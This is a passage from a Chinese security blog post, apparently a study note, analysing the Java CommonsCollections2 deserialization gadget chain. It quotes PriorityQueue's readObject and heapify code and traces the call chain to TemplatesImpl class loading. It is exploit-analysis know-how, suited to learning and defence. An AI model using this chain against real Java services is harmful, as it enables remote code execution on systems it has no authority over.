(comparator.compare(x, (E) c) &lt;= 0)</span><br><span class="line">             break;</span><br><span class="line">         queue[k] = c;</span><br><span class="line">         k = child;</span><br><span class="line">     &#125;</span><br><span class="line">     queue[k] = x;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> private void siftDown(int k, E x) &#123;</span><br><span class="line">     if (comparator != null)</span><br><span class="line">         siftDownUsingComparator(k, x);</span><br><span class="line">     else</span><br><span class="line">         siftDownComparable(k, x);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> private void heapify() &#123;</span><br><span class="line">     for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">         siftDown(i, (E) queue[i]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">     throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">     // Read in size, and any hidden stuff</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">     // Read in (and discard) array length</span><br><span class="line">     s.readInt();</span><br><span class="line"></span><br><span class="line">     SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);</span><br><span class="line">     queue = new Object[size];</span><br><span class="line"></span><br><span class="line">     // Read in all elements.</span><br><span class="line">     for (int i = 0; i &lt; size; i++)</span><br><span class="line">         queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">     // Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br><span class="line">     // spec has never explained what that might be.</span><br><span class="line">     heapify();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>PriorityQueue实例是反序列化类的入口点，根据列出来的代码可以看到，在该类的readObject方法中调用了该类的heapify方法，在heapify方法中又调用了该类的siftDown，由于在构造PriorityQueue时传入了Comparator，因此在siftDown方法中会调用siftDownUsingComparator，也就是在该方法中调用了Comparator实例的compare 方法，从而导致了整条反序列化链的执行。</p>
+<h5 id="反序列化函数调用链"><a href="#反序列化函数调用链" class="headerlink" title="反序列化函数调用链"></a>反序列化函数调用链</h5><p>根据上面的分析可以总结出函数的调用链如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject</span><br><span class="line">    PriorityQueue.heapify</span><br><span class="line">        PriorityQueue.siftDown</span><br><span class="line">            PriorityQueue.siftDownUsingComparator</span><br><span class="line">                TransformingComparator.compare</span><br><span class="line">                    InvokerTransformer.transform</span><br><span class="line">                        TemplatesImpl.newTransformer</span><br><span class="line">                            TemplatesImpl.getTransletInstance</span><br><span class="line">                                TemplatesImpl.defineTransletClasses</span><br></pre></td></tr></table></figure></p>
+<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>截止到现在，根据分析已经有两个可控数据执行点：ChainedTransformer和TemplatesImpl，两个反序列化漏洞执行链条：AnnotationInvocationHandler和PriorityQueue。现在可以思考下能不能将两个互相组合一下，形成新的反序列化漏洞？</p>
+<h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ol>
+<li><a href="https://xz.aliyun.com/t/2029" target="_blank" rel="noopener">Java反序列化漏洞-玄铁重剑之CommonsCollection(下)</a></li>
+<li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">fastjson 远程反序列化poc的构造和分析</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Java反序列化/" rel="tag"># Java反序列化</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/29/Java反序列化学习-CommonsCollections1/" rel="next" title="Java反序列化学习-CommonsCollections1">
+                <i class="fa fa-chevron-left"></i> Java反序列化学习-CommonsCollections1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">红猪</p>
+              <p class="site-description motion-element" itemprop="description">我活在世上，无非想要明白些道理，遇见些有趣的事。倘能如我所愿，我的一生就算成功。</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">21</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">31</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/0x4472" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:0x4472@protonmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Java反序列化利用"><span class="nav-number">1.</span> <span class="nav-text">Java反序列化利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#输入数据执行点"><span class="nav-number">1.1.</span> <span class="nav-text">输入数据执行点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化传导链"><span class="nav-number">1.2.</span> <span class="nav-text">反序列化传导链</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反序列化利用点"><span class="nav-number">1.3.</span> <span class="nav-text">反序列化利用点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CommonsCollections2"><span class="nav-number">2.</span> <span class="nav-text">CommonsCollections2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#介绍"><span class="nav-number">2.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用条件"><span class="nav-number">2.2.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码分析"><span class="nav-number">2.3.</span> <span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#输入数据执行点-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">输入数据执行点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化传导链-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">反序列化传导链</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反序列化函数调用链"><span class="nav-number">2.3.3.</span> <span class="nav-text">反序列化函数调用链</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#思考"><span class="nav-number">3.</span> <span class="nav-text">思考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文档"><span class="nav-number">4.</span> <span class="nav-text">参考文档</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">红猪</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
